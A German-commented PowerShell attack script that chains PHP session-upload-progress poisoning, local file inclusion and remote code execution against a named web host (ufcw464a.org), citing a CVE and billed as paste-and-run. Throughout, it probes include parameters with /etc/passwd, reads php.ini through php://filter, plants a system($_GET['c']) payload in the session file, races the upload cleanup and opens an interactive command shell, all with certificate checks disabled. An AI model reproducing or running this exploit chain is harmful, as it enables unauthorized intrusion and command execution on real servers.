#Requires -Version 5.1
<#
  ufcw_chain.ps1  -  automatische End-to-End-Kette
  Session-Poison -> LFI -> RCE (CVE-2026-109618, mod_php, serialize-handler-abhaengig)
  Paste-and-run. Log landet neben dem Skript.
#>
[CmdletBinding()]
param(
    [string] $Base    = 'https://ufcw464a.org/',
    [string] $SessId  = 'p2s8db650e9333e4c99',
    [string] $Cmd     = 'id',
    [int]    $Timeout = 25,
    [switch] $NoShell,
    [switch] $NoRace
)

$ErrorActionPreference = 'Stop'
$ProgressPreference    = 'SilentlyContinue'
try { [Net.ServicePointManager]::SecurityProtocol = 'Tls12,Tls11,Tls' } catch {}
try { [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true } } catch {}

$Log = Join-Path (Get-Location) ("ufcw_chain_{0}.log" -f (Get-Date -Format 'yyyyMMdd_HHmmss'))
function Log([string]$m, [string]$c = 'Gray') {
    $l = "[{0}] {1}" -f (Get-Date -Format 'HH:mm:ss'), $m
    Write-Host $l -ForegroundColor $c
    Add-Content -LiteralPath $Log -Value $l -Encoding UTF8
}
function Head([string]$m) { Log ''; Log ('=' * 70) 'DarkCyan'; Log $m 'Cyan'; Log ('=' * 70) 'DarkCyan' }

function Invoke-Target {
    param([string]$Url, [hashtable]$Headers, [byte[]]$Body, [string]$ContentType)
    $p = @{ Uri = $Url; UseBasicParsing = $true; TimeoutSec = $Timeout; MaximumRedirection = 0; ErrorAction = 'Stop' }
    if ($Body)    { $p.Body = $Body; $p.Method = 'POST'; $p.ContentType = $ContentType }
    if ($Headers) { $p.Headers = $Headers }
    $sw = [Diagnostics.Stopwatch]::StartNew()
    try {
        $r = Invoke-WebRequest @p; $sw.Stop()
        [pscustomobject]@{ Code = [int]$r.StatusCode; Body = [string]$r.Content; Ms = $sw.ElapsedMilliseconds; Hdr = $r.Headers }
    } catch {
        $sw.Stop(); $code = 0; $body = ''; $resp = $_.Exception.Response
        if ($resp) {
            try { $code = [int]$resp.StatusCode } catch {}
            try { $body = (New-Object IO.StreamReader($resp.GetResponseStream())).ReadToEnd() } catch {}
        }
        [pscustomobject]@{ Code = $code; Body = $body; Ms = $sw.ElapsedMilliseconds; Hdr = $null }
    }
}
function Write-Str([IO.MemoryStream]$ms, [string]$s) {
    $b = [Text.Encoding]::UTF8.GetBytes($s); $ms.Write($b, 0, $b.Length)
}
function New-Multipart {
    param([string]$Progress, [int]$Pad)
    $bnd = '----ps' + [Guid]::NewGuid().ToString('N')
    $ms  = New-Object IO.MemoryStream
    Write-Str $ms ("--$bnd`r`nContent-Disposition: form-data; name=`"PHP_SESSION_UPLOAD_PROGRESS`"`r`n`r`n$Progress`r`n")
    if ($Pad -gt 0) {
        Write-Str $ms ("--$bnd`r`nContent-Disposition: form-data; name=`"pad`"`r`n`r`n")
        $chunk = [Text.Encoding]::ASCII.GetBytes(('A' * 65536))
        $left = $Pad
        while ($left -gt 0) { $n = [Math]::Min($left, 65536); $ms.Write($chunk, 0, $n); $left -= $n }
        Write-Str $ms "`r`n"
    }
    Write-Str $ms ("--$bnd`r`nContent-Disposition: form-data; name=`"f`"; filename=`"a.txt`"`r`nContent-Type: text/plain`r`n`r`nX`r`n--$bnd--`r`n")
    @{ Bytes = $ms.ToArray(); Type = "multipart/form-data; boundary=$bnd" }
}
function Longest-B64([string]$s) {
    $best = ''
    foreach ($m in [regex]::Matches($s, '[A-Za-z0-9+/=\s]{24,}')) {
        $v = $m.Value -replace '\s', ''
        if ($v.Length -gt $best.Length) { $best = $v }
    }
    $best
}
function Get-Lfi([string]$path) {
    $r = Invoke-Target -Url ("$Base`?$Param=php://filter/convert.base64-encode/resource=$path")
    if ($r.Code -ne 200 -or -not $r.Body) { return $null }
    $b = Longest-B64 $r.Body
    if (-not $b) { return $null }
    try { [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) } catch { $null }
}
function Get-Inc([string]$path, [string]$extra = '') {
    Invoke-Target -Url ("$Base`?$Param=$path$extra")
}

# ======================================================== 0 Baseline
Head '0 - Baseline'
$r0 = Invoke-Target -Url $Base
Log ("GET / -> HTTP {0} | {1} ms | {2} B" -f $r0.Code, $r0.Ms, $r0.Body.Length)
if ($r0.Code -eq 0) { Log 'Host tot. Abbruch.' 'Red'; return }
$srv = ''
if ($r0.Hdr) { $srv = [string]$r0.Hdr['Server'] }
Log ("Server: {0}" -f $srv) 'DarkGray'
$IsFpm = ($srv -match 'nginx|fpm')
Log ("FPM-Pfad: {0}" -f $IsFpm) $(if($IsFpm){'Yellow'}else{'Green'})

# ======================================================== 1 Parameter
Head '1 - Include-Parameter suchen'
$Param = $null; $IncExec = $false
foreach ($p in 'file','q','lang','view','inc','path','template','dir','url','src','include','page') {
    $pl = Invoke-Target -Url ("$Base`?$p=/etc/passwd")
    $fi = Invoke-Target -Url ("$Base`?$p=php://filter/convert.base64-encode/resource=/etc/passwd")
    $hitP = $pl.Body -match 'root:x:0:0'
    $hitF = $false
    if ($fi.Body) { $b = Longest-B64 $fi.Body; if ($b) { try { $hitF = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) -match 'root:x:0:0' } catch {} } }
    $tag = if ($hitP) { 'PLAIN' } elseif ($hitF) { 'FILTER' } else { 'nein' }
    Log ("  {0,-10} {1}" -f $p, $tag) $(if($tag -ne 'nein'){'Green'}else{'DarkGray'})
    if ($tag -ne 'nein' -and -not $Param) { $Param = $p; $IncExec = $hitP }
    Start-Sleep -Milliseconds 120
}
if (-not $Param) { Log 'Kein Parameter. Abbruch.' 'Red'; return }
Log ("Parameter: {0} (includet: {1})" -f $Param, $IncExec) $(if($IncExec){'Green'}else{'Yellow'})

# ======================================================== 2 Konfiguration
Head '2 - php.ini und save_handler'
$ini = $null
foreach ($f in '/etc/php/7.3/apache2/php.ini','/etc/php/7.3/cli/php.ini','/etc/php/7.3/fpm/php.ini','/etc/php.ini','/usr/local/etc/php/php.ini') {
    $c = Get-Lfi $f
    if ($c -and $c -match 'memory_limit') { $ini = $c; Log ("ini: {0}" -f $f) 'Green'; break }
    Start-Sleep -Milliseconds 100
}
$SavePath = $null; $MemLimit = 0; $Handler = 'php'
if ($ini) {
    $m = [regex]::Match($ini, '(?m)^\s*session\.save_path\s*=\s*"?([^"\r\n]+)"?'); if ($m.Success) { $SavePath = $m.Groups[1].Value.Trim() }
    $m = [regex]::Match($ini, '(?m)^\s*memory_limit\s*=\s*"?(\d+)([KMG]?)')
    if ($m.Success) { $n = [int64]$m.Groups[1].Value; switch ($m.Groups[2].Value.ToUpper()) { 'K'{$n*=1024} 'M'{$n*=1048576} 'G'{$n*=1073741824} }; $MemLimit = $n }
    $m = [regex]::Match($ini, '(?m)^\s*session\.serialize_handler\s*=\s*(\S+)'); if ($m.Success) { $Handler = $m.Groups[1].Value.Trim() }
    $sh = [regex]::Match($ini, '(?m)^\s*session\.save_handler\s*=\s*(\S+)')
    if ($sh.Success) { Log ("save_handler = {0}" -f $sh.Groups[1].Value) $(if($sh.Groups[1].Value -match 'files'){'Green'}else{'Red'}) }
    foreach ($k in 'session.use_strict_mode','session.upload_progress.enabled','session.upload_progress.cleanup') {
        $mm = [regex]::Match($ini, "(?m)^\s*$([regex]::Escape($k))\s*=\s*(\S+)"); if ($mm.Success) { Log ("{0} = {1}" -f $k, $mm.Groups[1].Value) 'DarkGray' }
    }
}
if (-not $SavePath) { $SavePath = '/var/lib/php/sessions' }
if ($MemLimit -le 0) { $MemLimit = 262144 }
Log ("save_path={0}  memory_limit={1}  handler={2}" -f $SavePath, $MemLimit, $Handler) 'Cyan'

# ======================================================== 3 Session-Datei
Head '3 - Session-Datei lokalisieren'
$dirs = @($SavePath,'/var/lib/php/sessions','/var/lib/php/session','/tmp','/tmp/php_sessions','/var/lib/php5','/var/lib/php/7.3/sessions') | Select-Object -Unique
$SessFile = $null
foreach ($d in $dirs) {
    $c = Get-Lfi "$d/sess_$SessId"
    Log ("  {0,-30} {1}" -f $d, $(if ($null -eq $c) { '-' } else { "$($c.Length) B" })) $(if($null -ne $c){'Green'}else{'DarkGray'})
    if ($null -ne $c -and -not $SessFile) { $SessFile = "$d/sess_$SessId" }
    Start-Sleep -Milliseconds 120
}
if (-not $SessFile) { $SessFile = "$SavePath/sess_$SessId"; Log 'Keine Datei bestaetigt - nehme Standardpfad.' 'Yellow' }
else { Log ("Ziel: {0}" -f $SessFile) 'Green' }

# ======================================================== 4 strict_mode
Head '4 - strict_mode'
$Cookie = @{ Cookie = "PHPSESSID=$SessId" }
$rc = Invoke-Target -Url $Base -Headers $Cookie
$sc = ''; if ($rc.Hdr) { $sc = [string]$rc.Hdr['Set-Cookie'] }
if ($sc -and $sc -notmatch [regex]::Escape($SessId)) {
    Log 'strict_mode aktiv - neue ID uebernehmen' 'Yellow'
    if ($sc -match 'PHPSESSID=([^;]+)') { $SessId = $Matches[1]; $Cookie = @{ Cookie = "PHPSESSID=$SessId" } }
    foreach ($d in $dirs) { $c = Get-Lfi "$d/sess_$SessId"; if ($null -ne $c) { $SessFile = "$d/sess_$SessId"; break } }
    Log ("ID={0} Datei={1}" -f $SessId, $SessFile) 'Yellow'
} else { Log 'strict_mode aus' 'Green' }

# ======================================================== 5 Payload
Head '5 - Payload / Handler'
$PL = '<?php echo ''PWN:'';system($_GET[''c'']);?>'
if ($Handler -eq 'php_serialize') { Log 'Handler php_serialize - quote-freier Payload aktiv' 'Yellow' }
$probe = New-Multipart -Progress 'zz' -Pad 1024
Invoke-Target -Url $Base -Headers $Cookie -Body $probe.Bytes -ContentType $probe.Type | Out-Null
Start-Sleep -Milliseconds 300
$pf = Get-Inc $SessFile
if ($pf.Body -match 'a:\d+:\{s:') { Log 'bestaetigt: php_serialize' 'Yellow' }
elseif ($pf.Body -match 'upload_progress_zz\|') { Log 'bestaetigt: php' 'Green' }
else { Log 'Handler unklar - quote-freier Payload bleibt aktiv' 'DarkGray' }

# ======================================================== 6 OOM-Sweep
Head '6 - OOM-Fenster'
$sizes = @(($MemLimit-16384),($MemLimit-8192),($MemLimit-4096),$MemLimit,($MemLimit+4096),($MemLimit+8192),($MemLimit+32768),($MemLimit+65536)) | Where-Object { $_ -gt 0 } | Select-Object -Unique
$Poisoned = $false; $UsedPad = 0
foreach ($s in $sizes) {
    $mp = New-Multipart -Progress $PL -Pad $s
    $r = Invoke-Target -Url $Base -Headers $Cookie -Body $mp.Bytes -ContentType $mp.Type
    Start-Sleep -Milliseconds 450
    $chk = Get-Inc $SessFile
    $exec = $chk.Body -match 'PWN:'; $kept = $chk.Body -match 'upload_progress_'
    Log ("  pad {0,7} -> HTTP {1,4} {2,5}ms | {3}" -f $s, $r.Code, $r.Ms, $(if($exec){'EXEC'}elseif($kept){'liegt'}else{'leer'})) $(if($exec){'Green'}elseif($kept){'Yellow'}else{'DarkGray'})
    if ($exec -or $kept) { $Poisoned = $true; $UsedPad = $s; break }
    Start-Sleep -Milliseconds 350
}
if (-not $Poisoned -and -not $NoRace) {
    Log 'Kein Fenster - Race-Fallback' 'Yellow'
    $job = Start-Job -ScriptBlock {
        param($b,$h,$pl,$to)
        for ($i = 0; $i -lt 3000; $i++) {
            try {
                $ms = New-Object IO.MemoryStream
                $w = { param($s) $x = [Text.Encoding]::UTF8.GetBytes($s); $ms.Write($x,0,$x.Length) }
                & $w "--B`r`nContent-Disposition: form-data; name=`"PHP_SESSION_UPLOAD_PROGRESS`"`r`n`r`n$pl`r`n"
                & $w "--B`r`nContent-Disposition: form-data; name=`"pad`"`r`n`r`n$('A' * 300000)`r`n--B--`r`n"
                Invoke-WebRequest -Uri $b -Method Post -Headers $h -Body $ms.ToArray() -ContentType 'multipart/form-data; boundary=B' -UseBasicParsing -TimeoutSec $to | Out-Null
            } catch {}
        }
    } -ArgumentList $Base, $Cookie, $PL, $Timeout
    for ($i = 1; $i -le 150; $i++) {
        $t = Get-Inc $SessFile '&c=id'
        if ($t.Body -match 'uid=') { Log 'Treffer im Race' 'Green'; $Poisoned = $true; break }
        Start-Sleep -Milliseconds 250
    }
    Stop-Job $job -ErrorAction SilentlyContinue; Remove-Job $job -Force -ErrorAction SilentlyContinue
}
if (-not $Poisoned) { Log 'Poison fehlgeschlagen. Log pruefen (save_handler, cleanup, Rechte).' 'Red'; return }

# ======================================================== 7 Trigger
Head '7 - Trigger'
$out = $null
for ($i = 1; $i -le 60; $i++) {
    $t = Get-Inc $SessFile ('&c=' + [Uri]::EscapeDataString($Cmd))
    if ($t.Body -match 'PWN:([\s\S]{0,4000})') {
        $out = ($Matches[1] -replace '<[^>]+>', '').Trim()
        if ($out) { break }
    }
    Start-Sleep -Milliseconds 200
}
if ($out) { Log 'RCE:' 'Green'; Write-Host $out -ForegroundColor White } else { Log 'Kein Output - Schritt 6 wiederholen.' 'Red' }

# ======================================================== 8 Shell
if ($out -and -not $NoShell) {
    Head '8 - Shell (leer = Ende)'
    while ($true) {
        $c = Read-Host 'ps> '
        if ([string]::IsNullOrWhiteSpace($c)) { break }
        $t = Get-Inc $SessFile ('&c=' + [Uri]::EscapeDataString($c))
        if ($t.Body -match 'PWN:([\s\S]{0,6000})') { Write-Host (($Matches[1] -replace '<[^>]+>', '').Trim()) -ForegroundColor White }
        else { Write-Host $t.Body.Substring(0, [Math]::Min(400, $t.Body.Length)) -ForegroundColor DarkGray }
    }
}

Head 'Ende'
Log ("Param={0} ID={1} Datei={2} Pad={3}" -f $Param, $SessId, $SessFile, $UsedPad) 'Cyan'
Log ("Log: {0}" -f $Log) 'DarkGray'